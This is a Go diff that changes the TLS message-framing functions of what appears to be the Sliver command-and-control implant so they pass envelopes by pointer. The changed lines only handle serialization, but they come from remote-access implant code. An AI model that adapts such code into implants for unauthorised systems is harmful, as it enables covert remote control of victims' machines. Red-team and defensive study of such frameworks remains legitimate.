@@ -26,8 +26,8 @@ func mtlsRegisterSliver(conn *tls.Conn) {
 // socketWriteEnvelope - Writes a message to the TLS socket using length prefix framing
 // which is a fancy way of saying we write the length of the message then the message
 // e.g. [uint32 length|message] so the reciever can delimit messages properly
-func socketWriteEnvelope(connection *tls.Conn, envelope pb.Envelope) error {
-	data, err := proto.Marshal(&envelope)
+func socketWriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
+	data, err := proto.Marshal(envelope)
 	if err != nil {
 		// {{if .Debug}}
 		log.Print("Envelope marshaling error: ", err)
@@ -42,14 +42,14 @@ func socketWriteEnvelope(connection *tls.Conn, envelope pb.Envelope) error {
 }
 
 // socketReadEnvelope - Reads a message from the TLS connection using length prefix framing
-func socketReadEnvelope(connection *tls.Conn) (pb.Envelope, error) {
+func socketReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
 	dataLengthBuf := make([]byte, 4) // Size of uint32
 	_, err := connection.Read(dataLengthBuf)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("Socket error (read msg-length): %v\n", err)
 		// {{end}}
-		return pb.Envelope{}, err
+		return nil, err
 	}
 	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
 
@@ -79,10 +79,10 @@ func socketReadEnvelope(connection *tls.Conn) (pb.Envelope, error) {
 		// {{if .Debug}}
 		log.Printf("Unmarshaling envelope error: %v", err)
 		// {{end}}
-		return pb.Envelope{}, err
+		return &pb.Envelope{}, err
 	}
 
-	return *envelope, nil
+	return envelope, nil
 }
 
 // tlsConnect - Get a TLS connection or die trying
